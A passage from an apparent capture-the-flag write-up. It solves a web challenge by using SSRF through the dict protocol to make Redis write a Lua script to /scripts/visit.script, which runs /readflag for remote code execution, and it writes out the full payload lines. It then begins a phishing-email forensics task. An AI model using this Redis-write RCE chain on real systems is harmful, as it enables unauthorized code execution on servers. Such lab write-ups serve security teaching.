Some useful tests:

![Proof of dict protocol availability](/posts/ccsssc2025/img/CachedVisitor-3.png)

Container is connected to the network and can read files. The dict protocol is available and redis can be accessed

Analyzed the source code

```main.lua ```Read the contents between ```##LUA_START##``` and ```##LUA_END##``` from ```visit.script``` and run it as a script

```dockerfile
COPY flag /flag
COPY readflag /readflag
RUN chmod 400 /flag
RUN chmod +xs /readflag
```

The flag has permissions set and cannot be read directly.

Try to use redis to write visit.script to perform RCE

Write lua and test in local docker to output flag

```lua
##LUA_START##ngx.say(io.popen('/readflag'):read('*all'))##LUA_END##
```

Use redis to write lua to visit.script directly

```
dict://127.0.0.1:6379/set:payload:"##LUA_START##ngx.say(io.popen('/readflag'):read('*all'))##LUA_END##"
dict://127.0.0.1:6379/config:set:dir:/scripts/
dict://127.0.0.1:6379/config:set:dbfilename:visit.script
dict://127.0.0.1:6379/bgsave
```

After writing, you can execute what we wrote by sending a request at will Script

### Fishing E-mail

> Bob received a phishing email. Please find the return address and port of the Trojan.If the backlink address and port are 123.213.123.123:1234, then the sensitive information is MD5 (123.213.123.123:1234), that is, d9bdd0390849615555d1f75fa854b14f, which is based on the result of Cyberchef.

Found that the encoding format is Base64, we directly decode to view the content

I used CyberChef to extract the zip file and found that there was a password

Based on birthday, guess the password ```20001111```
